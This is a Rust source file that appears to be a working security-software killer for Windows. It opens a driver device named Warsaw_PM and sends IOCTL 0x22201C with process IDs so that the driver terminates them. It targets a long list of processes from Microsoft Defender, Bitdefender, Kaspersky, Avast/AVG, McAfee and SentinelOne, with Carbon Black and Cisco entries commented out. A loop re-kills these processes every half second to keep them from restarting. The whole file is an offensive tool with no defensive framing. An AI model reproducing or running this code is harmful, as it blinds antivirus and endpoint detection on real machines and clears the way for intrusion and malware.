use ctrlc;
use anyhow::{Context, Result, bail};
use std::ptr;
use std::ffi::CStr;
use std::mem::size_of;
use std::os::windows::ffi::OsStrExt;
use std::ffi::OsStr;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::winnt::{GENERIC_WRITE, GENERIC_READ, HANDLE};
use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
use winapi::shared::minwindef::LPVOID;
use winapi::um::ioapiset::DeviceIoControl;


const PROCESSES: &[&str] = &[
    // Microsoft Defender
    "MsMpEng.exe",                 // Core antimalware engine
    "MsMpEngCP.exe",               // Antimalware engine content process
    "MpCmdRun.exe",                // Command-line scan utility
    "NisSrv.exe",                  // Network Inspection Service (IDS)
    "SecurityHealthService.exe",   // Windows Security health monitor
    "SecurityHealthHost.exe",      // Security health host process
    "SecurityHealthSystray.exe",   // Security Center systray icon
    "MsSense.exe",                 // Defender for Endpoint sensor (EDR)
    "MsSecFw.exe",                 // Security firewall helper
    "MsMpSigUpdate.exe",           // Signature/definition updater
    "MsMpGfx.exe",                 // GPU-accelerated scan process
    "MpDwnLd.exe",                 // Definition download helper
    "MpSigStub.exe",               // Signature stub installer
    "MsMpCom.exe",                 // COM server for AV communication
    "MSASCui.exe",                 // Legacy Security Center UI
    "WindowsDefender.exe",         // Legacy Defender executable
    "WdNisSvc.exe",                // Defender Network Inspection svc
    "WinDefend.exe",               // Windows Defender service
    "smartscreen.exe",             // SmartScreen URL/file reputation

    // Bitdefender
    "vsserv.exe",                  // Core AV service daemon
    "bdservicehost.exe",           // Service host for BD modules
    "bdagent.exe",                 // Main BD agent/tray process
    "bdwtxag.exe",                 // Web threat protection agent
    "updatesrv.exe",               // Update service
    "bdredline.exe",               // Ransomware remediation
    "bdscan.exe",                  // On-demand file scanner
    "seccenter.exe",               // Security Center integration
    "bdsubwiz.exe",                // Subscription/license wizard
    "bdmcon.exe",                  // Management console
    "bdtws.exe",                   // TrafficLight web security
    "bdntwrk.exe",                 // Network protection module
    "bdfwfpf.exe",                 // Firewall/WFP filter driver helper
    "bdrepair.exe",                // Self-repair/recovery tool
    "bdwtxcfg.exe",                // Web threat config manager
    "bdamsi.exe",                  // AMSI integration module
    "bdscriptm.exe",               // Script monitoring (PowerShell, etc.)
    "bdfw.exe",                    // Firewall engine
    "bdsandbox.exe",               // Behavioral sandbox analyzer
    "bdenterpriseagent.exe",       // Enterprise management agent
    "bdappspider.exe",             // Application security scanner

    // Kaspersky
    "avp.exe",                     // Core AV protection process
    "avpui.exe",                   // AV UI/tray interface
    "klnagent.exe",                // Kaspersky Network Agent (KSC managed)
    "klnsacsvc.exe",               // Network Access Control service
    "klnfw.exe",                   // Network firewall module
    "kavfs.exe",                   // File server AV scanner
    "kavfsslp.exe",                // File server sleep/idle process
    "kavfsgt.exe",                 // File server gateway process
    "kmon.exe",                    // System monitor (behavior detection)
    "ksde.exe",                    // Security Data Exchange engine
    "ksdeui.exe",                  // SDE user interface
    "kavtray.exe",                 // System tray notification icon
    "kpf4ss.exe",                  // Personal firewall service
    "kpm.exe",                     // Password manager component
    "ksc.exe",                     // Security Center administration
    "klnupdate.exe",               // Definition & module updater

    // Avast/AVG
    "AvastSvc.exe",                // Core Avast service daemon
    "AvastUI.exe",                 // Avast user interface
    "AvastBrowserSecurity.exe",    // Browser security extension host
    "aswEngSrv.exe",               // Scan engine service
    "aswToolsSvc.exe",             // Avast tools/utilities service
    "aswidsagent.exe",             // Intrusion detection agent
    "avg.exe",                     // Core AVG process
    "avgui.exe",                   // AVG user interface
    "avgnt.exe",                   // AVG notification tray
    "avgsvc.exe",                  // AVG service daemon
    "avgidsagent.exe",             // AVG intrusion detection agent
    "avgemc.exe",                  // AVG email scanner
    "avgmfapx.exe",                // AVG managed firewall applet
    "avgsvca.exe",                 // AVG service agent
    "avgwdsvc.exe",                // AVG watchdog service
    "avgupsvc.exe",                // AVG update service

    // McAfee
    "McAfeeService.exe",           // Core McAfee service
    "McTray.exe",
    "McAPExe.exe",                 // McAfee AP (Access Protection)
    "mcshield.exe",                // On-access scanner (real-time)
    "mfemms.exe",                  // McAfee management service
    "mfeann.exe",                  // McAfee analytics/notification
    "mfefire.exe",                 // McAfee Firewall Core
    "mfemactl.exe",                // McAfee management controller
    "mfehcs.exe",                  // McAfee Host IPS catalog svc
    "mfemmseng.exe",               // Management service engine
    "mfevtps.exe",                 // McAfee validation trust svc
    "mcagent.exe",                 // McAfee agent (tray/UI)
    "mcuicnt.exe",                 // UI container process
    "mcmscsvc.exe",                // McAfee management framework
    "mcnasvc.exe",                 // McAfee network agent service
    "mcpromgr.exe",                // McAfee profile manager
    "mcods.exe",                   // On-demand scanner
    "mctask.exe",                  // Scheduled task runner
    "mcsacore.exe",                // Security assessment core
    "mcscript.exe",                // Script scanning engine
    "mfeffcoreservice.exe",        // Firewall core service
    "mfetp.exe",                   // Threat prevention module
    "mfevtp.exe",                  // Validation & trust protection
    "masvc.exe",
    "macmnsvc.exe",
    "macompatsvc.exe",
    "UpdaterUI.exe",
    "mfeatp.exe",
    "mfeesp.exe",
    "mfeensppl.exe",
    "mfemvedr.exe",

     // SentinelOne
    "SentinelAgent.exe",          // Core S1 agent process
    "SentinelAgentWorker.exe",    // S1 agent worker process
    "SentinelAgentUI.exe",        // S1 agent UI process
    "SentinelHelperService.exe",  // S1 helper service
    "SentinelMemoryScanner.exe",  // S1 memory scanner
    "SentinelNetworkScanner.exe", // S1 network scanner
    "SentinelStaticEngineScanner.exe",
    "SentinelServiceHost.exe",     // S1 service host daemon
    "SentinelStaticEngine.exe",    // Static AI analysis engine
    "SentinelUI.exe",              // S1 management UI/tray

    /* Carbon Black EDR / Response
    "cb.exe",                      // Core CB process
    "CbDefense.exe",               // CB Defense (cloud-based NGAV) agent
    "CbDefenseSvc.exe",            // CB Defense service daemon
    "CbOsR.exe",                   // OS-level response/remediation
    "RepMgr.exe",                  // Reputation manager (file hash lookups)
    "RepUtils.exe",               // Reputation utility helpers
    "RepUx.exe",                   // Reputation UX/interface
    "RepWAV.exe",                  // Reputation Windows AV integration
    "RepWSC.exe",                  // Reputation Windows Security Center
    "CbServerService.exe",         // CB server-side service (on-prem)
    "CbComms.exe",                 // Cloud/server communication relay
    "CbStream.exe",                // Event streaming to backend
    "CbStreamSvc.exe",             // Event streaming service
    "CbSensor.exe",                // Endpoint sensor (telemetry collector)
    "CbSensorService.exe",         // Sensor service daemon
    "CbLiveResponse.exe",          // Live Response remote shell session
    "cbagent.exe",                 // Legacy CB agent process
    "cbdaemon.exe",                // CB background daemon
    "cbresponse.exe",              // CB Response console/agent

    // Carbon Black App Control / Locker
    "Parity.exe",                  // App Control agent (new branding)
    "ParityService.exe",           // App Control service daemon
    "bit9agent.exe",               // Legacy Bit9 agent (app whitelisting)
    "bit9awsvc.exe",               // Bit9 approval workflow service
    "CarbonBlackClientSetup.exe",  // CB client installer/updater
    "BIT9CLIENT.exe",              // Legacy Bit9 client
    "bit9wscsvc.exe",              // Bit9 Windows Security Center svc
    "dascli.exe",                  // Device Application Service CLI
    "dasHost.exe",                 // Device Application Service host
    */

    /* Cisco Umbrella / Secure Client
    "CiscoUmbrellaService.exe",  // Main Umbrella service
    "CiscoUmbrellaDNS.exe",      // DNS enforcement agent
    "CiscoUmbrellaClient.exe",   // Roaming client
    "OpenDNSUpdater.exe",        // Legacy OpenDNS updater
    "OrgInfo.exe",               // Organization info utility
    "acaborttask.exe",           // AnyConnect task abort handler
    "aciseposture.exe",          // ISE posture compliance check
    "acumbrellaagent.exe",       // AnyConnect Umbrella module
    "csc_ui.exe",                // Cisco Secure Client UI
    "acnvm.exe",                 // Network visibility module
    "acswgagent.exe",            // Secure Web Gateway agent
    // WARNING: Killing vpnagent/vpnui will drop the VPN tunnel!
    // Uncomment ONLY if you are NOT operating through the VPN.
    // "vpnagent.exe",           // VPN service — kills active VPN connection
    // "vpnui.exe",              // VPN UI — kills VPN tray/interface
    "ac_swgclient.exe",          // SWG client proxy
    "UmbrellaDiagnostic.exe",   // Diagnostic utility
    */
    
];


fn pid_by_name(name: &str) -> Result<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if snapshot == INVALID_HANDLE_VALUE {
            bail!("[!]  Failed to create process snapshot");
        }

        let mut entry: PROCESSENTRY32 = std::mem::zeroed();
        entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut entry) == 0 {
            CloseHandle(snapshot);
            bail!("[!] Failed to get first process");
        }

        loop {
            let exe_name = CStr::from_ptr(entry.szExeFile.as_ptr()).to_string_lossy();

            if exe_name.eq_ignore_ascii_case(name) {
                let pid = entry.th32ProcessID;
                CloseHandle(snapshot);
                return Ok(pid);
            }

            if Process32Next(snapshot, &mut entry) == 0 {break}
        }

        CloseHandle(snapshot);
        bail!("[!]  Process '{}' not found", name);
    }
}



struct Driver {
    hDriver: HANDLE, 
}

impl Driver {
    /// Initializing the driver 
    
    fn Initialize() -> Result<Self> {

        let device_name: Vec<u16> = OsStr::new(r"\\.\Warsaw_PM")
            .encode_wide()
            .chain(Some(0))
            .collect();

        let result =  unsafe {
            CreateFileW(
                device_name.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                ptr::null_mut(),
                OPEN_EXISTING,
                0,
                ptr::null_mut()
            )};
        
        if result == INVALID_HANDLE_VALUE {
            bail!("[!] Failed to initialize the driver!");
            }

        println!("[+] Driver initialized successfully!");

        Ok(Self{hDriver: result})
    }

    fn ExecuteIOCTL(&self, pid: u32) -> Result<()> {
    
        let mut buffer = vec![0u8; 1036];
        
        // WRITE THE PID TO FIRST 4 BYTES
        buffer[0..4].copy_from_slice(&pid.to_le_bytes());
        
        let mut bytes_returned = 0;
        
        let result = unsafe {
            DeviceIoControl(
                self.hDriver,
                0x22201C,
                buffer.as_mut_ptr() as LPVOID, 
                1036,
                ptr::null_mut(),        
                0,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };
        
        if result == 0 {
            let error_code = unsafe { GetLastError() };
            println!("[!] DeviceIoControl failed for PID {}! Error code: 0x{:08X}", pid, error_code);
        }
        
        println!("[+] IOCTL 0x22201C sent for PID: {}", pid);
        Ok(())  
    }

    fn Cleanup(&self) -> Result<()> {
        
        let result = unsafe {CloseHandle(self.hDriver)};

        if result == 0 {
            bail!("[!] Failed to close the driver's handle!!")
        }
        
        println!("[*] Driver Handle closed!");
        
        Ok(())
    }

}


fn main() -> Result<()> {

    let hDriver = Driver::Initialize()?;
    println!("[+] Driver ready for operation, Handle: {:p}", &hDriver);
    println!("[*] Scanning for target processes...");
    println!("[*] Press CTRL+C to stop...");

    // CTRL+C Handler setup
    let running = Arc::new(AtomicBool::new(true));
    ctrlc::set_handler({
            let running = Arc::clone(&running);
            move || {
                println!("[!] Shutting down...");
                running.store(false, Ordering::SeqCst);
            }
        })?;
    
    // Loop to prevent processes from restarting
    while running.load(Ordering::SeqCst) {
        // Collect all target PIDs first
        let mut targets: Vec<(&str, u32)> = Vec::new();
        for p in PROCESSES {
            if let Ok(pid) = pid_by_name(p) {
                println!("  -- Found {} - PID: {}", p, pid);
                targets.push((p, pid));
            }
        }

        // Kill all found processes as fast as possible (no gaps)
        if !targets.is_empty() {
            println!("[*] Killing {} target(s) in rapid succession...", targets.len());
            for (name, pid) in &targets {
                hDriver.ExecuteIOCTL(*pid)?;
                println!("[+] Kill signal sent to {} (PID: {})", name, pid);
            }
        }

        // Small sleep to avoid busy-looping the CPU when no targets are found
        std::thread::sleep(std::time::Duration::from_millis(500));
    }

    println!("[*] Cleaning up ...");
    hDriver.Cleanup()?;

    Ok(())
}